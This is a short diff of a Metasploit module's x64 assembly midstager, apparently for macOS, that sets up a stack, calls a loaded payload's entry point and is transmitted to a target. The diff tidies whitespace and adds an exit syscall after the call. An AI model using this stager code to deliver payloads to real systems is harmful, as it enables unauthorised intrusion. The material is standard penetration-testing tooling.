@@ -101,9 +101,9 @@ module MetasploitModule
 
       ; setup stack?
       and rsp, -0x10              ; Align
-      add sp, 0x40                 ; Add room for initial stack and prog name
+      add sp, 0x40                ; Add room for initial stack and prog name
       mov rax, 109                ; prog name "m"
-      push 0                    ;
+      push 0                      ;
       mov rcx, rsp                ; save the stack
       push 0
       push 0
@@ -122,6 +122,11 @@ module MetasploitModule
       mov rax, #{entry_offset}
       add rsi, rax
       call rsi
+
+      ; exit
+      mov eax, 0x2000001
+      mov rdi, 0x1
+      syscall
     )
     midstager = Metasm::Shellcode.assemble(Metasm::X64.new, midstager_asm).encode_string
     print_status("Transmitting first stager...(#{midstager.length} bytes)")
